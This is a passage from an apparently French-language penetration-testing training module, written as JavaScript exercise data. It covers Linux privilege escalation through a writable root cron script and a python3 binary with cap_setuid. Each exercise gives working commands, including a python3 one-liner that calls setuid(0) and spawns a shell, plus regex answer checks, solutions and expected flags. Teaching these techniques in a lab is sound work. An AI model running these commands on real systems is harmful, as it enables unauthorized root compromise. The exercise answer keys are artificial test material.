      task: "Ajoutez une commande qui copie <code>/root/cron-flag.txt</code> vers <code>/tmp/cron-flag</code>, puis lisez le résultat après le passage du cron.",
      hint: "Utilisez <code>echo 'cp /root/cron-flag.txt /tmp/cron-flag' >> /opt/scripts/cleanup.sh</code> puis <code>sleep 65</code>.",
      accept: [/echo\s+.*cp\s+\/root\/cron-flag\.txt\s+\/tmp\/cron-flag.*>>\s+\/opt\/scripts\/cleanup\.sh.*sleep\s+65.*cat\s+\/tmp\/cron-flag/is],
      solution: "echo 'cp /root/cron-flag.txt /tmp/cron-flag && chmod 644 /tmp/cron-flag' >> /opt/scripts/cleanup.sh && sleep 65 && cat /tmp/cron-flag",
      output: ['FLAG{PRIVESC_CRON}'],
      read: "La commande ajoutée s'exécute en root. Le flag est copié dans un fichier lisible. En mission réelle, on documente et on retire la modification.",
      pivot: "Dernier vecteur : les capabilities. Cherchez <code>python3</code> avec <code>cap_setuid</code>."
    },
    {
      id: 'm12-e12',
      title: 'Exploiter une capability et capturer le flag root',
      context: "Python3 possède <code>cap_setuid+ep</code>. Vous devez devenir root et lire le flag final.",
      task: "Utilisez <code>getcap</code> pour confirmer la capability, puis Python pour appeler <code>setuid(0)</code> et lire <code>/root/root.txt</code>.",
      hint: "Utilisez <code>getcap /usr/bin/python3</code> puis <code>/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'</code>.",
      accept: [/getcap\s+\/usr\/bin\/python3.*python3\s+-c\s+["'].*setuid\(0\).*\/root\/root\.txt/is],
      solution: "getcap /usr/bin/python3 && /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"cat /root/root.txt\")'",
      output: [
        '/usr/bin/python3 = cap_setuid+ep',
        'FLAG{PRIVESC_ROOT}'
      ],
      read: "La capability <code>cap_setuid</code> sur un interpréteur permet de devenir root. Le flag final confirme la compromission totale de la machine.",
      pivot: "Rédigez le rapport : commentaire HTML → SSH → sudo find → SUID tar → cron → capability → root. Proposez les correctifs pour chaque vecteur."
    }
  ],
  quiz: 'q12'
};
